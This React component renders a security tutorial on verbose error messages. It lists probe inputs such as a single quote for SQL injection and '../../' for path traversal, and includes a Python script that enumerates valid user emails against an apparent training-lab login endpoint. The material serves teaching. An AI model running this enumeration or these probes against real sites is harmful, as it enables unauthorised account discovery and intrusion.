const VerboseErrors = () => {
  return (
    <div className="p-6 bg-gray-900 text-white rounded-md">
      {/* Title */}
      <h2 className="text-2xl font-bold mb-4">Understanding Verbose Errors</h2>

      {/* Description */}
      <p className="mb-4">
        Imagine you're a detective with a knack for spotting clues that others might overlook. In web development, verbose errors are like unintentional whispers of a system, revealing secrets meant to be kept hidden. 
        These detailed error messages help developers debug issues, but they can also expose sensitive data to attackers.
      </p>

      {/* Section: Information Leaks */}
      <h3 className="text-xl font-semibold mb-2">Verbose Errors Can Leak Information</h3>
      <ul className="list-disc pl-6 space-y-2 mb-4">
        <li><strong>Internal Paths:</strong> Reveals file paths and directory structures of the server.</li>
        <li><strong>Database Details:</strong> Exposes database names, table structures, or error responses.</li>
        <li><strong>User Information:</strong> Can reveal usernames or personal details during login attempts.</li>
      </ul>

      {/* Section: Inducing Verbose Errors */}
      <h3 className="text-xl font-semibold mb-2">Inducing Verbose Errors</h3>
      <p className="mb-4">Attackers provoke verbose errors using various techniques, such as:</p>

      <ul className="list-disc pl-6 space-y-2 mb-4">
        <li>
          <strong>Invalid Login Attempts:</strong> 
          Different error messages for "invalid username" vs. "wrong password" can reveal valid accounts.
        </li>
        <li>
          <strong>SQL Injection:</strong> 
          Entering a single quote (`'`) in a login field might cause an error revealing database schema details.
        </li>
        <li>
          <strong>File Inclusion/Path Traversal:</strong> 
          Using `../../` in input fields might disclose restricted file paths.
        </li>
        <li>
          <strong>Form Manipulation:</strong> 
          Modifying form parameters can force errors that expose backend logic.
        </li>
        <li>
          <strong>Application Fuzzing:</strong> 
          Tools like Burp Suite send various payloads to identify exploitable errors.
        </li>
      </ul>

      {/* Section: Automation with Python */}
      <h3 className="text-xl font-semibold mb-2">Automation with Python</h3>
      <p className="mb-4">
        Below is a Python script to check for valid emails on a vulnerable web app:
      </p>

      {/* Code Block */}
      <div className="bg-gray-800 p-4 rounded-md mb-4 overflow-x-auto">
        <pre className="text-green-300 text-sm">
          {`import requests
import sys

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'
    headers = {'User-Agent': 'Mozilla/5.0'}
    data = {'username': email, 'password': 'password', 'function': 'login'}

    response = requests.post(url, headers=headers, data=data)
    return response.json()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]
    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        response = check_email(email.strip())
        if "Email does not exist" in response['message']:
            print(f"[INVALID] {email.strip()}")
        else:
            print(f"[VALID] {email.strip()}")`}
        </pre>
      </div>

      <p className="mb-4">
        The script checks an email list against the web app, filtering valid and invalid ones based on error messages.
      </p>

    </div>
  );
};

export default VerboseErrors;
